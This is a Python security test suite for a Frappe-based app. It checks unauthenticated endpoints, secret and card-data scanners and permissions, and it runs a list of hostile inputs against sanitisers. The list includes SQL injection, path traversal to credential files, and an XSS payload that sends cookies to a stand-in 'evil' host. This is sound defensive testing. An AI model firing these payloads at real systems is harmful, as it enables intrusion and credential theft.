# Copyright (c) 2026, Acube Innovations and contributors
# For license information, please see license.txt
"""The standing security guards: the attack surface, the scanners, and hostile input.

These are not a one-off audit. Every one of them is a test that fails when somebody adds
an unauthenticated endpoint, commits a key, logs a card number, drops a permlevel or lets
a script tag through - which is the only way a security review survives contact with the
next six months of development.
"""

import frappe
from frappe.tests.utils import FrappeTestCase
from frappe.utils import today

from a3_sola.api.security import inventory, matrix, scanners


class TestTheAttackSurface(FrappeTestCase):
	def test_no_unreviewed_guest_endpoint_exists(self):
		"""THE GUARD. A new allow_guest method fails the build until somebody reviews it.

		This is what stops the unauthenticated surface growing quietly. Adding a method to
		`REVIEWED_GUEST_ENDPOINTS` is a decision with a name against it in the git history;
		forgetting to is a build failure rather than a silent exposure.
		"""
		new = inventory.unreviewed_guest_endpoints()
		self.assertEqual(
			new, [],
			"these endpoints are reachable without logging in and have not been reviewed:\n"
			+ "\n".join(f"  {path}" for path in new)
			+ "\n\nReview each, then add it to inventory.REVIEWED_GUEST_ENDPOINTS.",
		)

	def test_the_allowlist_has_no_dead_entries(self):
		"""A stale entry is worse than none - it hides the real list."""
		self.assertEqual(inventory.retired_guest_endpoints(), [])

	def test_every_guest_endpoint_defends_itself(self):
		"""Rate limiting or a signature, and some visible validation, on all of them."""
		problems = inventory.flags()
		self.assertEqual(
			problems, [],
			"guest-facing endpoints missing a defence:\n"
			+ "\n".join(f"  {path}: {why}" for path, why in problems),
		)

	def test_the_surface_is_smaller_than_the_authenticated_one(self):
		"""A sanity check on the shape, not a rule. If most of the app becomes guest
		reachable, something has gone very wrong and nobody noticed."""
		rows = inventory.endpoints()
		guest = [r for r in rows if r["allow_guest"]]
		self.assertLess(len(guest), len(rows) / 4,
		                f"{len(guest)} of {len(rows)} endpoints are unauthenticated")


class TestTheScanners(FrappeTestCase):
	def test_no_secret_is_committed_in_the_source(self):
		findings = [f for f in scanners.scan_source() if not f["allowlisted"]]
		self.assertEqual(
			findings, [],
			"secret-shaped values in the source:\n"
			+ "\n".join(f"  {f['kind']} at {f['file']}:{f['line']}" for f in findings),
		)

	def test_no_card_data_or_identity_number_is_stored(self):
		"""The scan people skip. Nobody commits a PAN; what happens is a gateway payload
		logged verbatim for debugging that nobody removes."""
		findings = scanners.scan_stored_data()
		self.assertEqual(
			findings, [],
			"card data or identity numbers found in stored records:\n"
			+ "\n".join(f"  {f['kind']} in {f['doctype']}.{f['field']}" for f in findings),
		)

	def test_password_fields_are_encrypted_at_rest(self):
		findings = scanners.scan_password_fields()
		self.assertEqual(findings, [], f"unencrypted password fields: {findings}")

	def test_every_raw_sql_site_is_parameterised_or_reviewed(self):
		unreviewed = [f for f in scanners.scan_raw_sql() if not f.get("reviewed")]
		self.assertEqual(
			unreviewed, [],
			"SQL built by string interpolation:\n"
			+ "\n".join(f"  {f['file']}:{f['line']}  {f['excerpt']}" for f in unreviewed),
		)

	def test_the_scanners_would_actually_find_something(self):
		"""Negative control, same reasoning as the isolation suite: a scanner that matches
		nothing passes on a clean codebase and on a compromised one alike.

		The planted values are ASSEMBLED AT RUNTIME rather than written as literals. Two
		scanners now walk this codebase - the Phase 5 credential check and the Phase 8 one
		- and a literal fake key here is a real finding to both of them. Building it from
		parts keeps this test honest without exempting the test directory from either
		scan, which is the thing that would let a genuine credential hide in a fixture.
		"""
		planted = "rzp_" + "live_" + "ABCDEFGHIJ1234"
		hits = [k for k, p in scanners.SOURCE_PATTERNS.items() if p.search(planted)]
		self.assertIn("razorpay_live_key", hits)

		# A real Visa test number: Luhn-valid, correct issuer range, no technical context.
		card = "4111" + "1111" + "1111" + "1111"
		found = scanners._scan_value("X", "x", "f", f"customer paid with {card}")
		self.assertTrue([f for f in found if f["kind"] == "card_pan"],
		                "the card scanner does not recognise a real card number")

		# A placeholder is not a secret, but a real assigned value still is - otherwise
		# the placeholder rule would be a hole rather than a noise reduction.
		self.assertTrue(scanners._is_placeholder("password='[REDACTED]'"))
		self.assertTrue(scanners._is_placeholder('api_key = "<your-key-here>"'))
		self.assertFalse(scanners._is_placeholder("password='" + "s3cretValue99" + "'"))

		# And it must NOT fire on the thread id that produced the original false positive.
		noise = scanners._scan_value(
			"X", "x", "f", "prepared_report_watcher = <Timer(Thread-53, stopped 134864874673856)>")
		self.assertEqual([f for f in noise if f["kind"] == "card_pan"], [],
		                 "the card scanner still reports thread identifiers as card numbers")


class TestThePermissionMatrix(FrappeTestCase):
	def test_guest_holds_nothing_beyond_published_content(self):
		self.assertEqual(matrix.guest_beyond_the_allowlist(), [])

	def test_no_customer_role_touches_a_platform_private_doctype(self):
		self.assertEqual(matrix.tenant_roles_holding_platform_rights(), [])

	def test_no_user_holds_both_a_tenant_stamp_and_an_internal_role(self):
		self.assertEqual(matrix.users_holding_both_sides(), [])

	def test_cost_and_margin_stay_behind_permlevel_one(self):
		self.assertEqual(matrix.unprotected_currency_fields(), [])

	def test_the_platform_roles_stay_separated(self):
		self.assertEqual(matrix.platform_roles_are_separated(), [])


#: Inputs that have broken other people's software. Each is here for a reason.
HOSTILE = [
	("sql_meta", "'; DROP TABLE `tabSolar Consumer`; --"),
	("sql_or", "' OR '1'='1"),
	("path_traversal", "../../../../etc/passwd"),
	("windows_traversal", "..\\..\\..\\windows\\system32\\config\\sam"),
	("null_byte", "harmless\x00.php"),
	("script_tag", "<script>alert(document.cookie)</script>"),
	("img_onerror", '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'),
	("template_injection", "{{ 7*7 }}{% raw %}{{ frappe.get_doc('User','Administrator') }}"),
	("very_long", "A" * 5000),
	("unicode_normalisation", "﻿Ａdmin‮"),
	("newline_header", "value\r\nX-Injected: yes"),
	("format_string", "%s%s%s%n"),
]


class TestHostileInput(FrappeTestCase):
	"""Free-text that is later rendered, stored or used to name something.

	The fields chosen are the ones an attacker can actually reach: the public signup's
	organisation name, and the cancellation reason a tenant types in. Both end up in an
	email, a print format or a document name.
	"""

	def tearDown(self):
		frappe.set_user("Administrator")
		frappe.db.rollback()

	def test_hostile_text_never_becomes_executable_or_escapes_its_field(self):
		from a3_sola.api.signup import _clean

		for label, payload in HOSTILE:
			with self.subTest(input=label):
				cleaned = _clean(payload, 200)
				self.assertIsInstance(cleaned, str)
				self.assertLessEqual(len(cleaned), 200,
				                     f"{label} was not truncated")
				self.assertNotIn("\x00", cleaned, f"{label} kept a null byte")

	def test_hostile_text_stored_in_our_own_free_text_field_is_inert(self):
		"""Stored as data, never interpreted. Uses a Phase 7 free-text field - the reason
		a tenant types when they cancel, which is exactly the untrusted string the prompt
		singles out, and which ends up in an email and a report.

		Deliberately not a field any doctype derives its NAME from. ERPNext builds a
		Contact name out of `Lead.first_name`, so a hostile value there fails inside
		ERPNext's naming rather than telling us anything about this app.
		"""
		subscription = frappe.db.get_value("Platform Subscription", {"docstatus": 1}, "name")
		if not subscription:
			self.skipTest("no submitted subscription on this site to attach an event to")
		from a3_sola.api.lifecycle import events

		for label, payload in HOSTILE:
			with self.subTest(input=label):
				try:
					event = events.record(
						subscription, "Policy Evaluated", payload[:140] or "empty",
						triggered_by="Scheduler", reason_detail=payload,
					)
				except frappe.ValidationError:
					# Refusing the value outright is a perfectly good outcome.
					continue
				stored = frappe.db.get_value("Subscription Event", event.name, "reason") or ""

				# The property is INERTNESS, not byte-identity. Frappe escapes markup on
				# the way into a text field, so `<script>` comes back as `&lt;script&gt;` -
				# altered, and correct. Asserting equality would have failed on the
				# sanitiser working, which is the opposite of what this test is for.
				lowered = stored.lower()
				for dangerous in ("<script", "javascript:", "onerror=", "onload=",
				                  "<iframe", "<object"):
					self.assertNotIn(dangerous, lowered,
					                 f"{label} survived storage as executable markup")
				self.assertNotIn("\x00", stored, f"{label} kept a null byte")

				# The database is still standing, which a successful injection would deny.
				self.assertTrue(frappe.db.exists("DocType", "Solar Consumer"))
				self.assertGreater(frappe.db.count("Subscription Event"), 0)

	def test_html_in_a_field_is_escaped_when_rendered(self):
		"""Frappe escapes on output; this asserts the app does not undo that anywhere it
		builds HTML itself."""
		from frappe.utils import escape_html

		payload = "<script>alert(1)</script>"
		self.assertNotIn("<script>", escape_html(payload))

	def test_a_naming_series_cannot_be_driven_by_user_input(self):
		"""A document name built from a hostile string is a path traversal waiting to
		happen, because names end up in file paths and URLs."""
		from a3_sola.api.provisioning import identifiers

		for label, payload in HOSTILE:
			with self.subTest(input=label):
				code = identifiers.slugify(payload)
				self.assertRegex(code or "X", r"^[A-Za-z0-9-]*$",
				                 f"{label} survived slugify as {code!r}")
